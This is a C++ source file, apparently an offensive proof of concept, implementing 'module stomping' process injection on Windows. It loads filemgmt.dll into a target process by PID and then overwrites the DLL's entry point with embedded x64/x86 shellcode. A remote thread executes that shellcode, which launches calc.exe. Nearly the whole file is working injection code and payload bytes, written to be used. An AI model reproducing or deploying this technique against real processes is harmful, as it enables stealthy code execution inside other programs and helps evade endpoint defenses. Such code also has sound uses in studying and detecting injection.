#include <iostream>
#include <string>
#include <windows.h>
#include <tlhelp32.h>

// Calc
#ifdef _M_X64
unsigned char hexData[452] = {
    0xE9, 0x0B, 0x01, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48,
    0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x41, 0x57, 0x65,
    0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x44, 0x8B, 0xF9, 0x48, 0x8B, 0x50, 0x18, 0x4C,
    0x8B, 0x72, 0x20, 0x4D, 0x8B, 0xC6, 0x4D, 0x8B, 0x48, 0x20, 0x4D, 0x8B, 0x00, 0x4D, 0x85, 0xC9,
    0x0F, 0x84, 0x89, 0x00, 0x00, 0x00, 0x49, 0x63, 0x41, 0x3C, 0x42, 0x8B, 0x8C, 0x08, 0x88, 0x00,
    0x00, 0x00, 0x85, 0xC9, 0x74, 0x79, 0x4D, 0x8D, 0x14, 0x09, 0x41, 0x8B, 0x52, 0x0C, 0x49, 0x03,
    0xD1, 0x33, 0xFF, 0xEB, 0x16, 0xC1, 0xCF, 0x0D, 0x41, 0x0F, 0xBE, 0xCB, 0x41, 0x80, 0xFB, 0x61,
    0x8D, 0x41, 0xE0, 0x0F, 0x4C, 0xC1, 0x03, 0xF8, 0x48, 0xFF, 0xC2, 0x44, 0x8A, 0x1A, 0x45, 0x84,
    0xDB, 0x75, 0xE2, 0x41, 0x8B, 0x52, 0x20, 0x45, 0x33, 0xDB, 0x49, 0x03, 0xD1, 0x45, 0x39, 0x5A,
    0x18, 0x76, 0x3C, 0x8B, 0x1A, 0x49, 0x03, 0xD9, 0x33, 0xF6, 0xEB, 0x16, 0xC1, 0xCE, 0x0D, 0x40,
    0x0F, 0xBE, 0xCD, 0x40, 0x80, 0xFD, 0x61, 0x8D, 0x41, 0xE0, 0x0F, 0x4C, 0xC1, 0x03, 0xF0, 0x48,
    0xFF, 0xC3, 0x40, 0x8A, 0x2B, 0x40, 0x84, 0xED, 0x75, 0xE2, 0x8D, 0x04, 0x37, 0x44, 0x3B, 0xF8,
    0x74, 0x31, 0x41, 0xFF, 0xC3, 0x48, 0x83, 0xC2, 0x04, 0x45, 0x3B, 0x5A, 0x18, 0x72, 0xC4, 0x4D,
    0x3B, 0xC6, 0x0F, 0x85, 0x5E, 0xFF, 0xFF, 0xFF, 0x33, 0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x18, 0x48,
    0x8B, 0x6C, 0x24, 0x20, 0x48, 0x8B, 0x74, 0x24, 0x28, 0x48, 0x8B, 0x7C, 0x24, 0x30, 0x41, 0x5F,
    0x41, 0x5E, 0xC3, 0x41, 0x8B, 0x4A, 0x24, 0x49, 0x03, 0xC9, 0x46, 0x0F, 0xB7, 0x04, 0x59, 0x41,
    0x8B, 0x4A, 0x1C, 0x49, 0x03, 0xC9, 0x42, 0x8B, 0x04, 0x81, 0x49, 0x03, 0xC1, 0xEB, 0xCB, 0xCC,
    0x40, 0x55, 0x48, 0x8D, 0x6C, 0x24, 0xA9, 0x48, 0x81, 0xEC, 0x00, 0x01, 0x00, 0x00, 0xC7, 0x45,
    0xB7, 0x75, 0x73, 0x65, 0x72, 0x33, 0xC0, 0xC7, 0x45, 0xBB, 0x33, 0x32, 0x2E, 0x64, 0x66, 0xC7,
    0x45, 0xBF, 0x6C, 0x6C, 0xC6, 0x45, 0xC1, 0x00, 0xC7, 0x45, 0xA7, 0x63, 0x61, 0x6C, 0x63, 0xC7,
    0x45, 0xAB, 0x2E, 0x65, 0x78, 0x65, 0xC6, 0x45, 0xAF, 0x00, 0xC6, 0x44, 0x05, 0xE7, 0x00, 0x48,
    0xFF, 0xC0, 0x48, 0x83, 0xF8, 0x68, 0x72, 0xF2, 0x33, 0xC0, 0xC6, 0x44, 0x05, 0xC7, 0x00, 0x48,
    0xFF, 0xC0, 0x48, 0x83, 0xF8, 0x18, 0x72, 0xF2, 0xB9, 0x8D, 0x10, 0xB7, 0xF8, 0xE8, 0x96, 0xFE,
    0xFF, 0xFF, 0x48, 0x8D, 0x4D, 0xB7, 0xFF, 0xD0, 0xB9, 0x70, 0xBE, 0x1C, 0x23, 0xE8, 0x86, 0xFE,
    0xFF, 0xFF, 0x48, 0x8D, 0x4D, 0xC7, 0x45, 0x33, 0xC9, 0x48, 0x89, 0x4C, 0x24, 0x48, 0x48, 0x8D,
    0x55, 0xA7, 0x48, 0x8D, 0x4D, 0xE7, 0x45, 0x33, 0xC0, 0x48, 0x89, 0x4C, 0x24, 0x40, 0x33, 0xC9,
    0x48, 0x83, 0x64, 0x24, 0x38, 0x00, 0x48, 0x83, 0x64, 0x24, 0x30, 0x00, 0x83, 0x64, 0x24, 0x28,
    0x00, 0x83, 0x64, 0x24, 0x20, 0x00, 0xFF, 0xD0, 0x33, 0xC0, 0x48, 0x81, 0xC4, 0x00, 0x01, 0x00,
    0x00, 0x5D, 0xC3, 0xCC 
};
#else
unsigned char hexData[327] = {
    0xE8, 0xC5, 0x00, 0x00, 0x00, 0xC2, 0x04, 0x00, 0x53, 0x56, 0x8B, 0xF1, 0x33, 0xD2, 0xEB, 0x12,
    0x0F, 0xBE, 0xCB, 0xC1, 0xCA, 0x0D, 0x80, 0xFB, 0x61, 0x8D, 0x41, 0xE0, 0x0F, 0x4C, 0xC1, 0x03,
    0xD0, 0x46, 0x8A, 0x1E, 0x84, 0xDB, 0x75, 0xE8, 0x5E, 0x8B, 0xC2, 0x5B, 0xC3, 0x55, 0x8B, 0xEC,
    0x83, 0xEC, 0x14, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x53, 0x56, 0x57, 0x8B, 0x40, 0x0C, 0x89,
    0x4D, 0xF4, 0x8B, 0x40, 0x14, 0x8B, 0xF8, 0x89, 0x45, 0xEC, 0x8B, 0x77, 0x10, 0x8B, 0x3F, 0x85,
    0xF6, 0x74, 0x4F, 0x8B, 0x46, 0x3C, 0x8B, 0x5C, 0x30, 0x78, 0x85, 0xDB, 0x74, 0x44, 0x8B, 0x4C,
    0x33, 0x0C, 0x03, 0xCE, 0xE8, 0x9F, 0xFF, 0xFF, 0xFF, 0x8B, 0x4C, 0x33, 0x20, 0x89, 0x45, 0xF8,
    0x03, 0xCE, 0x33, 0xC0, 0x89, 0x4D, 0xF0, 0x89, 0x45, 0xFC, 0x39, 0x44, 0x33, 0x18, 0x76, 0x22,
    0x8B, 0x0C, 0x81, 0x03, 0xCE, 0xE8, 0x7E, 0xFF, 0xFF, 0xFF, 0x03, 0x45, 0xF8, 0x39, 0x45, 0xF4,
    0x74, 0x1C, 0x8B, 0x45, 0xFC, 0x8B, 0x4D, 0xF0, 0x40, 0x89, 0x45, 0xFC, 0x3B, 0x44, 0x33, 0x18,
    0x72, 0xDE, 0x3B, 0x7D, 0xEC, 0x75, 0xA3, 0x33, 0xC0, 0x5F, 0x5E, 0x5B, 0xC9, 0xC3, 0x8B, 0x4D,
    0xFC, 0x8B, 0x44, 0x33, 0x24, 0x8D, 0x04, 0x48, 0x0F, 0xB7, 0x0C, 0x30, 0x8B, 0x44, 0x33, 0x1C,
    0x8D, 0x04, 0x88, 0x8B, 0x04, 0x30, 0x03, 0xC6, 0xEB, 0xDF, 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x6C,
    0x53, 0x33, 0xDB, 0xC7, 0x45, 0xE8, 0x75, 0x73, 0x65, 0x72, 0xC7, 0x45, 0xEC, 0x33, 0x32, 0x2E,
    0x64, 0x8B, 0xC3, 0x66, 0xC7, 0x45, 0xF0, 0x6C, 0x6C, 0x88, 0x5D, 0xF2, 0xC7, 0x45, 0xF4, 0x63,
    0x61, 0x6C, 0x63, 0xC7, 0x45, 0xF8, 0x2E, 0x65, 0x78, 0x65, 0x88, 0x5D, 0xFC, 0x88, 0x5C, 0x05,
    0x94, 0x40, 0x83, 0xF8, 0x44, 0x72, 0xF6, 0x8B, 0xC3, 0x88, 0x5C, 0x05, 0xD8, 0x40, 0x83, 0xF8,
    0x10, 0x72, 0xF6, 0xB9, 0x8D, 0x10, 0xB7, 0xF8, 0xE8, 0x10, 0xFF, 0xFF, 0xFF, 0x8D, 0x4D, 0xE8,
    0x51, 0xFF, 0xD0, 0xB9, 0x70, 0xBE, 0x1C, 0x23, 0xE8, 0x00, 0xFF, 0xFF, 0xFF, 0x8D, 0x4D, 0xD8,
    0x51, 0x8D, 0x4D, 0x94, 0x51, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x8D, 0x4D, 0xF4, 0x51, 0x53,
    0xFF, 0xD0, 0x33, 0xC0, 0x5B, 0xC9, 0xC3 
};

#endif

LPVOID FindModuleBaseById(DWORD pid, CHAR path[])
{
    HANDLE hModuleSnap = INVALID_HANDLE_VALUE; 
    MODULEENTRY32 me32 = {0};
    LPVOID lpModuleBaseAddress = NULL;

    //  Take a snapshot of all modules in the specified process. 
    hModuleSnap = CreateToolhelp32Snapshot( TH32CS_SNAPMODULE, pid ); 
    if( hModuleSnap == INVALID_HANDLE_VALUE ) 
    { 
        return NULL; 
    }

    //  Set the size of the structure before using it. 
    me32.dwSize = sizeof( MODULEENTRY32 ); 
 
    //  Retrieve information about the first module, 
    //  and exit if unsuccessful 
    if( !Module32First(hModuleSnap, &me32 )) 
    { 
        CloseHandle( hModuleSnap );     // Must clean up the snapshot object! 
        return NULL; 
    }

    do
    {
        if (!lstrcmpA(path, me32.szModule)){
            lpModuleBaseAddress = me32.modBaseAddr;
            break;
        }
    } while (Module32Next(hModuleSnap, &me32));

    CloseHandle( hModuleSnap ); 
    return lpModuleBaseAddress;
}

LPVOID FindEntryPoint(HANDLE hProcess, HMODULE hModule) {
	//BYTE* targetDLLHeader[0x1000];
	LPVOID targetDLLHeader = { 0 };
	DWORD sizeOfHeader = 0x1000;
	// Allocate local heap
	targetDLLHeader = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeOfHeader);
	// Reading the header of target dll 
	ReadProcessMemory(hProcess, (LPVOID)hModule, targetDLLHeader, sizeOfHeader, NULL);
	PIMAGE_DOS_HEADER dosHeder = (PIMAGE_DOS_HEADER)targetDLLHeader;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetDLLHeader + dosHeder->e_lfanew);
	// Getting entry point of the target dll
	DWORD_PTR dllEntryPoint = ntHeaders->OptionalHeader.AddressOfEntryPoint;
	wprintf(L"[+] DllEntryPoint offset: %p\n", (LPVOID)dllEntryPoint);
	// DLL EntryPoint in memory
	LPVOID dllEntryPointMem = (LPVOID)(dllEntryPoint + (DWORD_PTR)hModule);
	wprintf(L"[+] DllEntryPoint in memory: %p\n", dllEntryPointMem);
	return dllEntryPointMem;
}

BOOL ModuleStomping(DWORD pid,  LPTSTR path, PBYTE shellcode, SIZE_T shellcodeSize){

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess){
        return FALSE;
    }

    SIZE_T size = lstrlenA(path);
    LPVOID mem = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    std::cout << "[+] Alloc memory in target process, mem address: " << mem << std::endl;
    if (!mem){
        return FALSE;
    }

    WriteProcessMemory(hProcess, mem, path, size, NULL);
    HMODULE hKernel32 = GetModuleHandleA("kernel32");
    std::cout << "[+] kernel32 module base address: " << hKernel32 << std::endl;
    LPVOID pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");
    std::cout << "[+] LoadLibraryA address: " << pLoadLibraryA << std::endl;

    // Remote load dll
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, mem, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    // Find loaded dll module base
    LPVOID moduleBase = FindModuleBaseById(pid, path);
    std::cout << "[+] Moudle base address: " << moduleBase << std::endl;
    if (!moduleBase){
        return FALSE;
    }

    // calculate module entry point
    SIZE_T sizeOfHeader = 0x1000;
    PBYTE peHeaderBuff = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeOfHeader);
    ReadProcessMemory(hProcess, moduleBase, peHeaderBuff, sizeOfHeader, NULL);
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)peHeaderBuff;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)peHeaderBuff + dosHeader->e_lfanew);
    LPVOID entryPoint = (LPVOID)((ULONG_PTR)moduleBase + ntHeader->OptionalHeader.AddressOfEntryPoint);
    std::cout << "[+] Moudle entry of point: " << entryPoint << std::endl;

    // Write shellcode to target process
    WriteProcessMemory(hProcess, entryPoint, shellcode, shellcodeSize, NULL);

    getchar();
    // Start shellcode
    CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)entryPoint, NULL, 0, NULL);
    
    // Clean up
    CloseHandle(hProcess);
    HeapFree(GetProcessHeap(), 0, peHeaderBuff);

    return TRUE;
}

int main(int argc, char** argv) {
    if (argc !=2){
        std::cout << "usage: <pid>" << std:: endl;
        return -1;
    }

    DWORD pid = atoi(argv[1]);
    CHAR path[] = {"filemgmt.dll"};
    ModuleStomping(pid, path, hexData, sizeof(hexData));

    return 0;
}
